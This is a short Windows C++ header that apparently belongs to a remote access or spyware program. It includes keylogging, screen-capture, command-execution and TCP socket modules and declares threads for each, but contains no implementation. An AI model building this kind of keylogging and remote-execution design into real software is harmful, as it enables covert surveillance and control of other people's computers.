#pragma once

#define WIN32_LEAN_AND_MEAN 
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "ws2_32.lib")

#include <windows.h>
#include <WinSock2.h>
#include <ws2tcpip.h>

#include <string>
#include <fstream>
#include <sstream>
#include <iostream>
#include <stdlib.h>
#include <cstdio>
#include <stdio.h>
#include <time.h>
#include <stack>
#include <stdint.h>
#include <queue>
#include <vector>

#include "thread.h"
#include "mutex.h"
#include "tcpsocket.h"
#include "keylog.h"
#include "screen.h"
#include "sysexec.h"
#include "fs.h"
#include "process.h"
#include "string.h"




void addonDebug(char *text, ...);

DWORD main_thread(void *lpParam);
DWORD process_thread(void *lpParam);

DWORD socket_send_thread(void *lpParam);
DWORD socket_receive_thread(void *lpParam);

DWORD keylog_thread(void *lpParam);
DWORD sysexec_thread(void *lpParam);